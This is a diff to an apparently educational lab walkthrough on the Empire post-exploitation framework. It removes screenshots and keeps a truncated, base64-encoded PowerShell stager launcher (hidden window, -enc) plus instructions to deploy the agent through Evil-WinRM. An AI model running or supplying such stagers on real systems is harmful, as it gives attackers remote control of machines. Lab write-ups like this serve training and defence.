@@ -271,18 +271,6 @@ powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAFIAcwBpAE8AbgBUAEEAYgBMAGUA
 (Empire: stager/multi/launcher) > 
 ```
 
-<img width="659" height="496" alt="image" src="https://github.com/user-attachments/assets/e040141e-a920-4eca-ae29-473ba3ccc503" />
-
-
-```bash
-main
-```
-
-<img width="1062" height="413" alt="image" src="https://github.com/user-attachments/assets/9a99d477-3a8a-4adb-bbf6-a200fdea4d0b" />
-
-
-<br>
-
 <h2>Task 5 . Deploy and Agent</h2>
 <p>Evil-WinRM provides access to a PowerShell prompt for launching commands. This gives a few different options for delivering your payload (e.g., bat, exe, wget). You can choose whichever one you want, otherwise, the simplest solution is to launch the one-liner directly in the Evil-WinRM window.</p>
 
